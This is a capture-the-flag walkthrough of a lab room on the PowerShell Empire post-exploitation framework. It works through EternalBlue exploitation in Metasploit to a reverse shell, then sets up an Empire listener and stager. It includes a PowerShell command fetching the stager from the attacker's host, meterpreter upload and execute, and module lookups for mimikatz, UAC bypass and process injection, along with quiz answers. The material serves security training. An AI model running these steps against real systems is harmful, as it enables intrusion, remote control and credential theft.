# PS Empire

Part of the Red Primer series, learn how to use this powerful post-exploitation framework.

# [Task 1] Deploy!

**Deploy this machine and discover what exploit this machine is vulnerable to. (Hint hint, this notice the VM name. I recommend completing the room 'Blue' prior to this room for this purpose alone.)**

**Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.**

## #1.1 - Deploy this machine and learn what exploitation this box is susceptible to!

A basic port scan reveals a Windows 7 machine with several common ports open, one of which being 445:

~~~
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-07-29T12:26:03+00:00; +1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h15m00s, deviation: 2h30m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:70:eb:ce:02:dc (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-07-29T07:25:57-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-29T12:25:57
|_  start_date: 2020-07-29T12:23:30
~~~

The machine is vulnerable to the Eternal Blue vulnerability (CVE-2017-0143)

~~~
$ nmap -p 445 --script smb-vuln-ms17-010 10.10.63.14
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-29 14:40 CEST
Nmap scan report for 10.10.63.14
Host is up (0.072s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
~~~

## #1.2 - Exploit the vulnerability to spawn a reverse shell!

Let's fire up msfconsole and exploit this vulnerability:

~~~
$ msfconsole -q
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.63.14
rhost => 10.10.63.14
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit 

[*] Started reverse TCP handler on 10.9.0.54:4444 
[*] 10.10.63.14:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.63.14:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.63.14:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.63.14:445 - Connecting to target for exploitation.
[+] 10.10.63.14:445 - Connection established for exploitation.
[+] 10.10.63.14:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.63.14:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.63.14:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.63.14:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.63.14:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.63.14:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.63.14:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.63.14:445 - Sending all but last fragment of exploit packet
[*] 10.10.63.14:445 - Starting non-paged pool grooming
[+] 10.10.63.14:445 - Sending SMBv2 buffers
[+] 10.10.63.14:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.63.14:445 - Sending final SMBv2 buffers.
[*] 10.10.63.14:445 - Sending last fragment of exploit packet!
[*] 10.10.63.14:445 - Receiving response from exploit packet
[+] 10.10.63.14:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.63.14:445 - Sending egg to corrupted connection.
[*] 10.10.63.14:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.9.0.54:4444 -> 10.10.63.14:49334) at 2020-07-29 14:48:19 +0200
[+] 10.10.63.14:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.63.14:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.63.14:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=



C:\Windows\system32>
~~~

# [Task 2] Install

PowerShell Empire is a powerful post-exploitation framework which allows us to perform various functions such as privesc, password gathering, situational awareness, and many more!

Link to the official website: https://www.bc-security.org/post/the-empire-3-0-strikes-back

Clone the following GitHub page and run the initial setup script: https://github.com/BC-SECURITY/Empire/

~~~
# cd /opt
# git clone https://github.com/BC-SECURITY/Empire.git
# cd /opt/Empire
# ./setup/install.sh
~~~

When prompted, enter in a server negotiation password. This can be left blank for random generation, however, you should record this somewhere such as a LastPass vault.

Launch Empire with either `./empire` or `/opt/Empire/empire`


# [Task 3] Listeners

If you're going to play ball, first you have to learn how to catch. Similar to 'catching' a reverse shell with Netcat, we first have to set up a listener in order to properly handle any sort of agent we would install on our victim machine. Answer the following questions using the listeners help menu and then spawn a basic listener. 

## #3.1

**Once empire has launched, type help to view the various menus. Which menu to we launch to access listeners?**

Answer: `listeners`

## #3.2

**Launch the listeners menu. In a manner similar to cobalt strike/metasploit, this will launch a contextual submenu. For the sake of this tutorial, we will be using an http listener in order to catch our connections. Type the command 'uselistener http' now. You can double-tap tab to view all options for listeners following typing 'uselistener'**

~~~
# ./empire
(Empire) > listeners
[!] No listeners currently active 
(Empire: listeners) > uselistener http
(Empire: listeners/http) > 
~~~

## #3.3

**What command can we now type to view all of the options related to our selected listener type?**

*Hint: Use the help command to find this new command*

Answer: `ìnfo`

~~~
(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  Name              True        http                             Name for the listener.
  Host              True        http://172.16.222.130            Hostname/IP for staging.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  Port              True                                         Port for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  StagingKey        True        55a84458b227b692ffeac1cc8ec2264b Staging key for initial agent negotiation.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  CertPath          False                                        Certificate path for https listeners.
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  Headers           True        Server:Microsoft-IIS/7.5         Headers for the control server.
  Cookie            False       RszXYAsGWiZzlQy                  Custom Cookie Name
  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
  Proxy             False       default                          Proxy to use for request (default, none, or other).
  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.
  SlackChannel      False       #general                         The Slack channel or DM that notifications will be sent to.
~~~

## #3.4

**Once the information regarding the listener pops up, peruse this for some of the more interesting options we can set in order to disguise our actions more. Which option can we use to set specific times when our listener will be active?**

Answer: `WorkingHours`

## #3.5

**Similar to changing/spoofing what browser you are using on the internet, what option can we set to appear as a different user agent (i.e. chrome, firefox, etc)?**

Answer: `DefaultProfile`

## #3.6

**What option can we use to set the port which the listener will bind to?**

Answer: `Port`

## #3.7

**In addition to changing our browser profile, we can change what our server appears as. What option can we set to change this?**

*Hint: Depending on the context of the help menu you have up, this option might not show up (this is a rare case though). To provide further context to this question, the server version can effective change your listener to appear as Microsoft IIS or possibly Apache. It's all about obfuscation in this context.*

Answer: `ServerVersion` (notice that the option is now `Headers` in the new release)

## #3.8

**Launch our newly created listener on port 80 with the command 'execute'. What message is displayed following successfully launching the listener?**

~~~
(Empire: listeners/http) > set Host 10.9.0.54
(Empire: listeners/http) > set Port 80
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
~~~

Answer: `Listener successfully started!`

## #3.9

**We can verify that our listener is now active by typing what command?**

*Hint: Same command as the one we used to open up the listeners submenu*

~~~
(Empire: listeners/http) > listeners

[*] Active listeners:
                                                                                                                                                                                                                                          
  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  http              http            http://10.9.0.54:80                  5/0.0                      

(Empire: listeners) >
~~~

Answer: `listeners`

# [Task 4] Stagers 

Stagers metaphorically and literally set the stage for post-exploitation by retrieving the remaining code and associated information necessary to spawn a full-fledged agent.

## #4.1

**First, type the command 'usestager' and double-tap tab to view all options we have for stagers. Which option allows us to use a batch file?**

~~~

(Empire: listeners) > usestager 
multi/bash                osx/applescript           osx/launcher              osx/shellcode             windows/dll               windows/launcher_sct      windows/shellcode         
multi/launcher            osx/application           osx/macho                 osx/teensy                windows/ducky             windows/launcher_vbs      windows/teensy            
multi/macro               osx/ducky                 osx/macro                 windows/backdoorLnkMacro  windows/hta               windows/launcher_xml      windows/wmic              
multi/pyinstaller         osx/dylib                 osx/pkg                   windows/bunny             windows/launcher_bat      windows/macro             
multi/war                 osx/jar                   osx/safari_launcher       windows/csharp_exe        windows/launcher_lnk      windows/macroless_msword  
(Empire: listeners) > usestager
~~~

Answer: `windows/launcher_bat`

## #4.2

**Let's finish our previous command and select the batch file option. Press enter to finalize this. What is our new path to the 'module' we have selected?**

*Hint: Empire: ???? is part of our new prompt following selecting this module*

~~~
(Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > 
~~~

Answer: `stager/windows/launcher_bat`

## #4.3

**Since we've previously set our listener to use http, we must now set the associated options within our stager we are building to match that. What option must we set in order to accomplish this?**

*Hint: Use the info command to view our options which we may set*

~~~

(Empire: stager/windows/launcher_bat) > info

Name: BAT Launcher

Description:
  Generates a self-deleting .bat launcher for
  Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  Language         True        powershell        Language of the stager to generate.
  StagerRetries    False       0                 Times for the stager to retry
                                                 connecting.
  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,
                                                 otherwise displayed on the screen.
  Delete           False       True              Switch. Delete .bat after running.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                 powershell code, uses the
                                                 ObfuscateCommand for obfuscation types.
                                                 For powershell only.
  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
                                                 Only used if Obfuscate switch is True.
                                                 For powershell only.
  UserAgent        False       default           User-agent string to use for the staging
                                                 request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                 or other).
  ProxyCreds       False       default           Proxy credentials
                                                 ([domain\]username:password) to use for
                                                 request (default, none, or other).
  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in
                                                 the stager code.
  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in
                                                 the stager code.
~~~

Answer: `Listener`

## #4.4

**Type execute to finish creating our stager. Where is the stager saved?**

~~~
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute

[*] Stager output written out to: /tmp/launcher.bat
~~~

Answer: `/tmp/launcher.bat`

## #4.5

**Using any shell you have previously gained into our victim system transport the stager batch file to the system and execute it. This can be done in numerous ways depending on the stager used, be prepared to be flexible with your transportation methods similarly to how you might handle an msfvenom package.**

I first tried to download the `launcher.bat` file on the Windows machine via the reverse shell with a powershell command (`powershell -c "Invoke-WebRequest 'http://10.9.0.54:8000/launcher.bat' -OutFile 'C:\windows\temp\launcher.bat'"`) but it failed. I decided to upgrade my reverse shell to a meterpreter (`session -u 1`) to directly upload the file, which worked perfectly.

~~~
meterpreter > upload /tmp/launcher.bat c:/windows/temp/launcher.bat
[*] uploading  : /tmp/launcher.bat -> c:/windows/temp/launcher.bat
[*] Uploaded 5.01 KiB of 5.01 KiB (100.0%): /tmp/launcher.bat -> c:/windows/temp/launcher.bat
[*] uploaded   : /tmp/launcher.bat -> c:/windows/temp/launcher.bat

meterpreter > execute -f launcher.bat
Process 1772 created.
~~~

# [Task 5] Agents and Post-Exploitation 

Interact with our ses.. er agents and do neat things. 

## #5.1

**First, type agents to view our registered agents.**

~~~
(Empire: agents) > agents

[*] Active agents:
                                                                                                                                                                                                                                          
 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 BW41RVG5 ps 10.10.63.14     JON-PC            *WORKGROUP\SYSTEM       powershell         1592   5/0.0    2020-07-29 16:42:10  http            
~~~

## #5.2

**Once you've typed agents to list the registered agents, the agents submenu will become active. Use the help menu to answer the following questions.**

~~~
(Empire: agents) > help

Commands
========
agents            Jump to the agents menu.
autorun           Read and execute a list of Empire commands from a file and execute on each new agent "autorun <resource file> <agent language>" e.g. "autorun /root/ps.rc powershell". Or clear any autorun setting with "autorun clear" and show current autorun settings with "autorun show"
back              Go back to the main menu.
clear             Clear one or more agent's taskings.
creds             Display/return credentials from the database.
exit              Exit Empire.
help              Displays the help menu.
interact          Interact with a particular agent.
kill              Task one or more agents to exit.
killdate          Set the killdate for one or more agents (killdate [agent/all] 01/01/2016).
list              Lists all active agents (or listeners).
listeners         Jump to the listeners menu.
lostlimit         Task one or more agents to 'lostlimit [agent/all] [number of missed callbacks] '
main              Go back to the main menu.
remove            Remove one or more agents from the database.
rename            Rename a particular agent.
resource          Read and execute a list of Empire commands from a file.
searchmodule      Search Empire module names/descriptions.
sleep             Task one or more agents to 'sleep [agent/all] interval [jitter]'
uselistener       Use an Empire listener module.
usemodule         Use an Empire PowerShell module.
usestager         Use an Empire stager.
workinghours      Set the workinghours for one or more agents (workinghours [agent/all] 9:00-17:00).
~~~

## #5.3

**What command do we use to interact with an agent?**

Answer: `interact`

## #5.4

**What about if we wanted to list any usernames and passwords we have gathered?**

Answer: `creds`

## #5.5

**And if we wanted to 'deactivate' an agent for a while to avoid detection?**

Answer: `sleep`

## #5.6

**How about if we wanted to delete an agent or disconnect it?**

Answer: `kill`

## #5.7

**Moving into the post exploitation modules, what command can we use to search through these?**

Answer: `searchmodule`

## #5.8

**We'll start with the most important module, find the module which plays a specific AC/DC song.**

*Hint: Song: Thunderstruck*

~~~
(Empire: agents) > searchmodule AC/DC

 powershell/trollsploit/thunderstruck

        Play's a hidden version of AC/DC's Thunderstruck video while maxing
        out a computer's volume.
~~~

Answer: `python/trollsploit/osx/thunderstruck` (to be updated with new version: `powershell/trollsploit/thunderstruck`)

## #5.9

**What if we wanted to perform an lsa dump with a certain popular windows credential gathering tool?**

*Hint: mimikatz*

~~~
(Empire: agents) > searchmodule lsadump

 powershell/credentials/mimikatz/dcsync

        Runs PowerSploit's Invoke-Mimikatz function to extract a given account
        password through Mimikatz's lsadump::dcsync module. This doesn't need
        code execution on a given DC, but needs to be run from a user context
        with DA equivalent privileges.


 powershell/credentials/mimikatz/lsadump*

        Runs PowerSploit's Invoke-Mimikatz function to extract a particular
        user hash from memory. Useful on domain controllers.


 powershell/credentials/mimikatz/dcsync_hashdump

        Runs PowerSploit's Invoke-Mimikatz function to collect all domain
        hashes using Mimikatz'slsadump::dcsync module. This doesn't need code
        execution on a given DC, but needs to be run froma user context with
        DA equivalent privileges.
~~~

Answer: `powershell/credentials/mimikatz/lsadump`

## #5.10

**Sometime we might not have the permissions level that we require to perform further actions, what module set might we have to use to get around UAC?**

~~~
 powershell/privesc/bypassuac

        Runs a BypassUAC attack to escape from a medium integrity process to a
        high integrity process. This attack was originally discovered by Leo
        Davidson. Empire uses components of MSF's bypassuac injection
        implementation as well as an adapted version of PowerSploit's Invoke--
        Shellcode.ps1 script for backend lifting.
~~~

Answer: `bypassuac`

## #5.11

**What module family allows us to gather additional information about the network we are on?**

~~~
(Empire: agents) > searchmodule powershell/recon

 powershell/recon/fetch_brute_local

        This module will logon to a member server using the agents account or
        a provided account, fetch the local accounts and perform a network
        based brute force attack.


 powershell/recon/find_fruit

        Searches a network range for potentially vulnerable web services.


 powershell/recon/get_sql_server_login_default_pw

        Based on the instance name, test if SQL Server is configured with
        default passwords.


 powershell/recon/http_login

        Tests credentials against Basic Authentication.
~~~

Answer: `recon`

## #5.12

**Our process we have compromised might not be the most stable, how do we migrate to another process? (This will have a specific module answer)**

~~~
 powershell/management/psinject

        Utilizes Powershell to to inject a Stephen Fewer formed ReflectivePick
        which executes PS codefrom memory in a remote process. ProcID or
        ProcName must be specified.
~~~

Answer: `powershell/management/psinject`

## #5.13

**Last but not least, what module can we use to turn on remote desktop access for our purposes?**

~~~
 powershell/management/enable_rdp*

        Enables RDP on the remote machine and adds a firewall exception.
~~~

Answer: `powershell/management/enable_rdp`